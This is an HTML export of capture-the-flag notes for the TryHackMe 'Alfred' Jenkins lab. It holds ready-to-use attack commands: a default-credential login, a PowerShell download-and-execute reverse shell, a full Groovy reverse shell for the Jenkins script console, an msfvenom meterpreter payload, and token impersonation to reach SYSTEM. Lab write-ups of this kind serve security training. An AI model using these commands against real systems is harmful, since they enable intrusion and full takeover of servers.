<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>alfred</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>alfred</h1><br/><strong>Alfred</strong><br /><br />nmap -Pn -sV -sC -O -vv 10.10.3.206<br /><br />Scanning 10.10.3.206 [1000 ports]<br />Discovered open port 8080/tcp on 10.10.3.206<br />Discovered open port 80/tcp on 10.10.3.206<br />Discovered open port 3389/tcp on 10.10.3.206<br /><br /><br />we browse to http://10.10.3.206:8080<br /><br />Login using default credentials for jenkins ----  <strong>admin:admin</strong><br /><br /><strong>Foothold</strong><br /><strong>Way-1</strong><br /><br />THM Reference<br /><br />Go to Build History.<br />http://10.10.3.206:8080/view/all/builds<br /><br />Click on Project 1<br />http://10.10.3.206:8080/job/project/<br /><br />On the left click on configure<br />http://10.10.3.206:8080/job/project/configure<br /><br /><br /><img src="images/6-1.png" alt="images/6-1.png" /><br /><br />Powershell Payload for reverse shell using Nishang.<br />https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1<br /><br /><em><strong>cd /opt<br />git clone https://github.com/samratashok/nishang.git<br />cd /opt/nishang/Shells<br /></strong></em><br /><br />Note: We have to host the <em><strong>Invoke-PowerShellTcp.ps1</strong></em> file with <em><strong>python2 -m SimpleHTTPServer 80</strong></em><br /><br /><em><strong>powershell iex (New-Object  Net.WebClient).DownloadString(&#39;http://10.11.72.31:80/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp  -Reverse -IPAddress 10.11.72.31 -Port </strong></em><strong>7777</strong><br /><br />Run listener in our attack system. <em><strong>rlwrap nc -lvnp 7777</strong></em><br /><br /><strong>Note:</strong> As we have command execution we can use any reeverse shell. eg upload nc.exe and get netcat reverse shell etc.<br /><br />Enter our powershell payload in command and APPLY then SAVE.<br /><br />Then on the left click on “<strong>Build Now</strong>&quot;<br /><br />We will have the reverse shell in our netcat listener.<br /><br /><br />Or<br /><br /><strong>Foothold</strong><br /><strong>Way-2</strong><br /><br />Go to Jenkins -→ Manage jenkins -→ Script Consoie<br />http://10.10.65.127:8080/script<br /><br />It allows for any groovy language script<br /><br />We will use the following groovy reverse shell and listen with netcat in kali.<br /><br /><em><strong>String host=&quot;10.11.72.31&quot;;int port=6666;String cmd=&quot;cmd.exe&quot;;Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</strong></em><br /><br />and<br /><br /><em><strong>lwrap nc -lvnp 6666</strong></em><br /><br />Once we hit run. We will get a reverse shell<br /><br /><br />Get the user flag at <strong>C:\Users\Bruce\Desktop\user.txt</strong><br /><br /><br /><strong>Shell Switch</strong><br />Now, we switch to meterpreter shell for easier prevelege escalation.<br /><br />we make a meterpreter payload using msfvenom.<br /><em><strong>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.72.31 LPORT=8888 -a x86 --encoder x86/shikata_ga_nai -f exe -o jenkins_revshell.exe</strong></em><br /><br />We host this using python webserver.<br /><br />Download using the last Powershell technique or any other.<br /><em><strong>powershell &quot;(New-Object System.Net.WebClient).Downloadfile(&#39;http://10.11.72.31:8000/jenkins_revshell.exe&#39;,&#39;jenkins_revshell.exe&#39;)&quot;</strong></em><br /><br /><strong><br />Start Listner in msfconsole:</strong><br /><br /><em><strong>use multi/handler<br />SET PAYLOAD windows/meterpreter/reverse_tcp<br />SET LHOST 10.11.72.31<br />SET LPORT 8888<br /></strong></em><br /><strong>To Run the Rev Shell Executible:<br /><br /></strong><em><strong>Start-Process &quot;jenkins_revshell.exe&quot;</strong></em><br />OR<br /><em><strong>powershell -c &quot;Start-Process &#39;jenkins_revshell.exe&#39;&quot; </strong></em>   from cmd.exe<br /><br />We should get a session on meterpreter after this.<br /><br /><br /><br /><strong>Prevelege Escalation Using Token Impersonation:</strong><br /><br />Check privileges with “<em><strong>whoami /priv</strong></em>”<br /><strong>SeDebugPrivilege, SeImpersonatePrivilege</strong> are the ones that help to escalate the privelege. Both are enabled here.<br /><br /><strong>In the meterpreter:</strong><br /><em><strong>load incognito</strong></em><strong>	</strong>			:		Loads the Incognito extention of meterpreter used for token impersonation<br /><em><strong>list_tokens -g</strong></em>				:		It will list all available tokens<br /><br /><em><strong>impersonate_token BUILTIN\Administrators</strong></em><em>	</em>	:	This will impersonate the Administrator token<br /><br />Verify with <em><strong>getuid</strong></em><br /><br />We are now <em><strong>NT AUTHORITY\SYSTEM</strong></em> as token but we still need a high privelege process.<br />ideally migrate to a high privelege process. <em><strong>eg.lsass.exe or services.exe</strong></em><br /><br />use <em><strong>ps</strong></em> command to show all process.<br /><em><strong>getpid</strong></em> to show our current process ID.<br /><em><strong>migrate PID</strong></em> to go to a high privelege process<br /><br />Now we have successfully elevated the priveleges.<br />The root flag is at <em><strong>C:\Windows\System32\config\root.txt</strong></em><br /><br />Thanks!! </div>
</body>
</html>
